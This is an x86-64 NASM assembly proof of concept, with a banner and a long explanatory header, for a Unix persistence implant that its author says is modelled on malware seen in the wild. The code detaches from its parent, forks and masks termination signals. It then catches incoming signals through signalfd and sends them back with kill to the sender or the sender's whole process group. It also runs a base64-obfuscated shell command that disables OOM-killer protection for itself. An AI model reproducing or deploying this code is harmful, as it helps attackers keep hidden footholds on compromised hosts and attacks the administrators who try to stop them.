
;                          _                                                 
;                /        Yb                                                    
;               .         Sl  gg                                                
;              .          S'  ""                                                
;             .          dP   gg    ,ggg,,ggg,     ,gggg,gg   ,ggg,    ,gggggg, 
;            .-         dP    SS   ,S" "SP" "S,   dP"  "YSl  iS" "Si   dP""""Sl 
;            .--       IB     AS   CS   Al   Bl  iS'    ,Sl  lS, ,Sl  ,S'    Sl 
;             .-.      Ib,_ _,SS,_,dP   Sl   Yb,,dS,   ,dSl  `YbadP' ,dP     YS,
;              --.     '"YSSSP""YSSP'   Sl   `YSP"YSSSSP"SSSSSSP"YSSSSP      `YS  . asm
;               --.                                  ,dSl'                    
;               -.       446 bytes of madness     ,dP'Sl                     
;               .                                ,S"  Sl                     
;              .          ~ lvti                lS   Sl                     
;             ,                                 `S, ,Sl                     
;            /                                   `YSP"                      



;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;
;   This PoC was developed for maintaining uninterrupted presence on Unix hosts...with a small twist. 
;   For every signal that is being sent to the parent process, the program sends it back to the sender by parsing the 
;   siginfo struct and extracting relevant data about the signal transmitter. It is a reconstruction of a similar mechanism  
;   in Go that I observed in the wild a few years back, yet lacked the required skillset to dive deeper into re-writing 
;   it with asm. Various config options are set randomly and some are tunables that can be enabled with specific #define
;   keywords. Booleans are stored right after the siginfo struct, with offsets +1 and +2.
;   
;
;   The execution flow is as follows:
;   
;       -0-         Random initialization of boolean flags 
;       -I-         Decrease process' niceness to 19 and detach from initial parent proc with setsid(0x00)
;       -II-        Optional subreaper setup with prctl()
;       -III-       Invocation of fork() and flow division into parent and child
;       -IV-        Masking desired signals with RT_SIGPROCMASK
;       -V-         Obtaining fresh file descriptor for reading signal events with signalfd()
;       -VI-        Getting new events infinitely from file desciptor (blocking read() syscall)
;       -VII-       Disable overcommit memory restrictions for curent PID and PPID
;       -VIII-      Waitings a bit to prevent zombification and ensure that child proc runs fine
;       -X-         Graceful exit(0)
;   
;   
;   All data is saved on the stack and copied to R15 register, while signalfd descriptor is held in R9 and RDI.
;   The info related to the signal sender (it's PID or PGID) is saved in R12 for future use - either sender's exclusive 
;   PID or it's whole procgroup can be the recipient of signal throwback mechanism. Kernel with version >= 6 introduces 
;   3 new fields in the siginfo struct, which are important to consider when allocating space on stack. The OOM disabler
;   command is encoded in base64 and invoked directly with "$(<cmd>|base64 -d)" so that NASM preprocessor does not 
;   complain about any escape sequences. TTY detachment is performed only after the logic confirms that current PPID !=1;
;   both the call of prctl() and setsid() happens when currently held UID or GUID equals 0. The RCX register is used to
;   initiate read loop count (set with 2), and is consecutively incremented and decremented - this could have been
;   implemented with a single non-conditional jump, but why bother :'>
;
;   Signal masking used in step V is crucial, as without it the standard sighandler would kick in without of a proper
;   sendback ever happening. There are some obvious limitations to the presented approach - without some heavy IPC kernel
;   hooking, the SIGKILL and SIGSTOP cannot be ignored from userspace. For the OOM part, some sudo would be necessary,
;   and if the subreaper option is enabled, it sometimes deadlocks due to the presence of the wait4() issued by the
;   parent process at the end. Neverthless, I hope that you will find this code useful, and treat it is a solid foundation
;   for more extensive research of the IPC mechanisms and signal disposition.
;
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



BITS 64


;                           - [ C O N F I G ] - 

; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; 
;                                                                               ;
; Undef if kernel version < 6.0 is being targeted                               ;
%define KERNEL_6                                                                ;
;                                                                               ;
;                                                                               ;
%define SUBREAPER                                                               ;
;                                                                               ;
; Uncomment to monitor top 5 termination signals (defined a few lines below)    ;
%define TARGET_SIGNAL 10                                                        ;
;                                                                               ;
; Use alternative instruction mnemonics in some places                          ;
; %define ALT                                                                   ;
;                                                                               ;
; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; 


                                                                                
; Placeholders for randomly generated booleans                                  
%define TARGET_PROCGROUP r15+siginfo_size+1                                     
%define LOOP_SENDBACK r15+siginfo_size+2                                        

; Syscalls
%define SYS_PRCTL 157
%define SYS_FORK 57
%define SYS_RT_SIGPROCMASK 14
%define SYS_SIGNALFD 282
%define SYS_GETPGID 121
%define SYS_GETPPID 110
%define SYS_GETPID 39
%define SYS_GETEUID 107
%define SYS_SETSID 112
%define SYS_KILL 62
%define SYS_EXECVE 59
%define SYS_EXIT 60
%define SYS_WAIT4 61
%define SYS_SETPRIORITY 141

; Parameters
%define PR_SET_CHILD_SUBREAPER 36
%define SIG_BLOCK 1
%define MIN_PRIORITY 19
%define OPTS_LENGTH 2
%define SIGSETSIZE 8
%define SHELL '//bin/sh'

; Numeric values of signals
%define SIGINT 2
%define SIGABRT 6
%define SIGALRM 14
%define SIGTERM 15

; Hex characters for OOM cmd
%define X_NULL 0x00         ; 0
%define X_LBRACE 0x28       ; (
%define X_RBRACE 0x29       ; )
%define X_DOLL 0x29         ; $
%define X_PIPE 0x7c         ; |

; Siginfo struct def for 5.X and 6.X
; If smth fails for your preprocessor, rename .code and .arch reserved keywords
struc siginfo
    .signo resd 1     ;[u32]
    .errno resd 1     ;[s32]
    .code resd 1      ;[s32]
    .pid resd 1       ;[u32]
    .uid resd 1       ;[u32]
    .fd resd 1        ;[s32]
    .tid resd 1       ;[u32]
    .band resd 1      ;[u32]
    .overrun resd 1   ;[u32]
    .trapno resd 1    ;[u32]
    .status resd 1    ;[s32]
    .intr resd 1      ;[s32]
    .ptr resq 1       ;[u32]
    .utime resq 1     ;[u32]
    .stime resq 1     ;[u32]
    .addr resq 1      ;[u32]
    .addr_lsb resb 2  ;[u32]x2
    .pad resb 2       ;[u32]x2
    %ifdef KERNEL_6
    .scall resd 1     ;[s32]
    .call_addr resq 1 ;[u64]
    .arch resd 1      ;[u32]
    %endif
endstruc 


; Macro for masking a signal
%macro sig_mask 1-*
    %rep %0
        push SYS_RT_SIGPROCMASK
        pop rax
        push %1
        pop rsi
        push SIG_BLOCK
        pop rdi
        xor rdx, rdx
        push SIGSETSIZE
        pop r10
        syscall
    %endrep
%endmacro

; Set random boolean flag at offset 
%macro set_randbool 1
    rdtsc                               ; Obtain random seed in RAX
    %ifndef ALT
    push 2
    pop r9
    %else
    xor r9, r9
    inc r9
    inc r9                              ; Different ways of initializing R9 with 2
    %endif
    div r9                              ; RDX = random remainder of division by 2 
    mov [%1], rdx
%endmacro

; Exit 0 like a hero
%macro exit 0
    push SYS_EXIT                       
    pop rax
    xor rdi, rdi
    syscall
%endmacro



section .text
global _start
_start:


    ; - - - - - - - - - [ ORIG PROCESS ]
    xor rbx, rbx                        ; Zero-out RBX
    %rep 2
    push rbx                            ; Prepare stack by pushing 0x00 twice
    %endrep
    sub rsp, siginfo_size+OPTS_LENGTH   ; Reserve space for siginfo struct and for 2 random bool values
    mov r15, rsp                        ; Save the reserved stack pointer to R15
    set_randbool TARGET_PROCGROUP
    set_randbool LOOP_SENDBACK
    push SYS_GETEUID                    ; Check if root
    pop rax
    syscall
    cmp rax, rbx                        ; RBX already set with 0x00 (in first instruction)
    jne no_sudo
    push SYS_GETPGID                    ; Obtain current parent PGID
    pop rax
    xor rdi, rdi
    syscall
    push rax
    pop r9                              ; Save PGID in r9
    push SYS_GETPID                     ; Obtain current PID
    pop rax
    syscall
    cmp rax, r9                         ; Compare PID with PGID
    je already_detached
    push SYS_SETSID
    pop rax
    syscall
    push SYS_GETPPID
    pop rax                             ; Finally get current parent process ID
    syscall
    cmp rax, 1                          ; Check if it is in fact the PID of init
    je already_detached
    exit 
    already_detached:
    push SYS_SETPRIORITY
    pop rax
    xor rdi, rdi                        ; PRIO_PROCESS == 0x00
    xor rsi, rsi                        ; Scope == urrent process == 0x00
    push MIN_PRIORITY
    pop rdx
    syscall                             ; setpriority(0x00, 0x00, 19)
    no_sudo:
    %ifdef SUBREAPER                    
    push SYS_PRCTL
    pop rax
    push PR_SET_CHILD_SUBREAPER
    pop rdi
    syscall                             ; prctl(PR_SET_CHILD_SUBREAPER) if macro SUBREAPER is defined
    %endif
    push SYS_FORK                       ; Fork to spawn a child proces
    pop rax
    syscall
    push rbx
    xor rbx, rbx                        ; Zero-out RBX again to compare against return of fork() in RAX
    cmp rax, rbx                        ; Ensure that we are in child process
    pop rbx
    jne oom                             ; Parent jumps to OOM disabler, child continues execution 



    ; - - - - - - - - - [ CLONED PROCESS ]

    %ifdef TARGET_SIGNAL
    sig_mask TARGET_SIGNAL              ; Mask desired signal...
    %else
    sig_mask SIGINT, SIGABRT, SIGALRM, SIGTERM
    %endif
    push SYS_SIGNALFD                   ; ... or above 4 signals
    pop rax                             ; Preparing SIGNALFD syscall
    %ifndef ALT
    xor rdi, rdi                              
    dec rdi                             ; RDI == -1 == fresh file descriptor
    %else
    xor rdi, rdi
    inc rdi
    neg rdi                             ; RDI == 0 ---> 1 ---> -1
    %endif
    xor rdx, rdx
    %ifdef TARGET_SIGNAL
    push TARGET_SIGNAL
    %else
    push SIGABRT | SIGALRM | SIGINT | SIGTERM              
    %endif
    pop rsi                             ; SIG_BLOCK uses sigorset(), so we create a mask by ORing each signal number
    syscall
    push rax
    pop r9                              ; New FD is stored in R9
    read_loop:
    push 2                              ; Infinite loop (RCX = 1 after every decrement)
    pop rcx
    push r9
    pop rdi                             ; Newly created file descriptor is placed in RDI
    xor rax, rax                        ; SYS_READ == 0x00, so simple xor here
    syscall
    get_sender_pid:
    mov r12, [r15+siginfo.pid]          ; Save sender's PID to r12
    push rbx                            ; Save RBX state
    lea rbx, [TARGET_PROCGROUP]
    cmp rbx, 0x01                       ; Check if signal should be sent back to whole procgroup
    je get_sender_pgid
    pop rbx
    push r12
    pop rdi
    jmp send_sig_back
    get_sender_pgid:                    ; Target Group PID instead of sender's PID
    pop rbx
    push SYS_GETPGID
    pop rax
    push r12                             
    pop rdi                             ; Store PGID in RDI
    syscall
    send_sig_back:
    push SYS_KILL
    pop rax
    %ifndef TARGET_SIGNAL                 
    mov rsi, [r15+siginfo.signo]        ; If no specific signal is defined then the received signum is sent back
    %else
    push TARGET_SIGNAL
    pop rsi
    %endif
    syscall                             ; kill(siginfo.signo, siginfo.pid)
    lea rbx, [LOOP_SENDBACK]
    cmp rbx, 0x01
    jne stop_loop                       ; If LOOP_SENDBACK is set...
    loop send_sig_back                  ; ...infinitely send the signal 
    stop_loop:



    ; - - - - - - - - - [ PARENT PROCESS ]

    oom:                                ; Start of OOM disabler
    push    SYS_EXECVE
    pop     rax
    cdq
    mov     rcx, SHELL                  ; /bin/sh -c <command>
    push    rdx
    push    rcx
    push    rsp
    pop     rdi
    push    rdx
    push    word '-c'                   
    push    rsp
    pop     rbx
    push    rdx
    call    x_cmd                       ; Set adjacent priority reported for oomkiller to the lowest value 
    db X_DOLL, X_LBRACE, "ZWNobyAtOTk5ID4gL3Byb2MveyQkLCQocHMgLW8gcHBpZD0gLXAgIiQhIil9L29vbV9hZGogfHwgZWNobyAyID4gL3Byb2Mvc3lzL3ZtL292ZXJjb21taXRfbWVtb3J5IA==", 0x7c, "base64 -d", X_RBRACE, X_NULL
    x_cmd:
    push    rbx
    push    rdi
    push    rsp
    pop     rsi
    syscall                             ; echo -999 > /proc/{$$,$(ps -o ppid= -p "$!")}/oom_adj || echo 2 > /proc/sys/vm/overcommit_memory 
    reap:
    push SYS_WAIT4                      ; wait4(-1, 0, 0) to reap potential zombies
    pop rax
    xor rdx, rdx
    xor rdi, rdi
    dec rdi                             ; After XOR and decremnt, RDI equals -1
    xor rsi, rsi
    syscall                             ; This is blocking until child process terminates
    exit                                ; Au revoir!

















